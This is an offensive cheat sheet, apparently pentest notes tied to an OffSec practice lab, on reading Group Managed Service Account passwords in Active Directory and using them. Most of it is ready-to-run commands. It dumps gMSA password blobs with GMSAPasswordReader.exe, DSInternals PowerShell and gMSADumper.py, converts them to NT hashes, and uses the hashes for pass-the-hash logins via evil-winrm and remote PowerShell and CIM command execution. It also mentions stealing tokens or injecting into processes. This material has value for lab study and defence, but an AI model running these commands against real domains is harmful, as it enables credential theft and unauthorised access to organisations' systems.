### Abusing the Ability to Read GMSA Passwords

#### Overview
There are several ways to abuse the ability to read the Group Managed Service Account (gMSA) password. These methods exploit the intended behavior of gMSAs when they are logged on to computers or when you have access to their credentials. Below is a professional, streamlined cheat sheet outlining these methods and their execution.

---

### Abuse Scenarios

#### 1. GMSA Logged On to a Computer
- **Description**: If the gMSA is currently logged on to a computer account with permission to retrieve its password:
  - **Action**: Steal the token from the process running as the gMSA.
  - **Alternative**: Inject into the process running as the gMSA.

#### 2. GMSA Not Logged On to a Computer
- **Description**: If the gMSA is not logged on to a computer:
  - **Action**: Create a scheduled task or service to run as the gMSA.
  - **Execution**: The computer account will start the task or service as the gMSA, allowing you to abuse the gMSA logon in the same manner as a standard user.
  - **Reference**: See the "HasSession" help modal for additional details on this technique.

---

### Methods to Retrieve gMSA Passwords

#### Using [GMSAPasswordReader.exe](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/raw/refs/heads/main/Tools/GMSAPasswordReader.exe)
``` shell
.\GMSAPasswordReader.exe --accountname 'Target_Account'
```
![image](https://github.com/user-attachments/assets/5bd3e7f0-c1d6-4eef-b6b0-9491a5d09c59)
`The rc4_hmac hash is the same as the NT hash, they are interchangeable.`
With the user’s NTLM hash, we can perform a pass-the-hash attack using evil-winrm to get a foothold on the victim. 
```shell
evil-winrm -i <Target-IP> -u svc_apache$ -H 41bcd07b8cc9636826fe07ff9539ca57
```

#### **Using Active Directory and DSInternals PowerShell Modules**

1. Save the gMSA password blob to a variable:
   ```powershell
   $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
   $mp = $gmsa.'msDS-ManagedPassword'
   ```

2. Decode the data structure using the DSInternals module:
   ```powershell
   ConvertFrom-ADManagedPasswordBlob $mp
   ```

3. Build an NT-Hash for Pass-the-Hash (PTH):
   ```powershell
   (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
   ```

4. Alternatively, create a Credential Object with the plain password:
   ```powershell
   $cred = New-Object System.Management.Automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
   ```

---

### Using Credentials

#### **Option 1: Create a New Session**
1. Start a new session:
   ```powershell
   $session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
   ```

2. Enter the session:
   ```powershell
   Enter-PSSession -Session $session
   ```

3. Run commands remotely:
   ```powershell
   Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
   ```

#### **Option 2: Run Commands via CIM**
1. Build the command:
   ```powershell
   $Command = 'whoami'
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
   ```
# From kali linux we can use tool [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper/tree/main)
Reads any gMSA password blobs the user can access and parses the values.
```shell
python3 gMSADumper.py -u user -p password -d domain.local
```
Pass the Hash, specific LDAP server:
```shell
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```
Kerberos Authentication, specific LDAP server:
```shell
python gMSADumper.py -k -d domain.local -l dc01.domain.local
```
### Machine [Heist](https://portal.offsec.com/labs/practice)
